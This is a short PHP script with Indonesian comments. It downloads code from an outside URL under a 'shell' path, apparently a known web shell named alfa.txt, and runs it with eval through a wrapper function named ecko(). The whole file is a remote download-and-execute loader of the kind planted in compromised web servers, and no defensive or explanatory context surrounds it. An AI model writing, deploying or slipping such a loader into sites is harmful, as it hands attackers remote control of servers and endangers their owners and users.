<?php
function ecko($code) {
    eval("?>".$code);
}

$url = "https://mega-prize.org/shell/alfa.txt"; // URL target
$code = @file_get_contents($url);

if ($code === false || empty($code)) {
    die("Gagal mengambil atau konten kosong.");
}

// Eksekusi pakai ecko()
ecko($code);
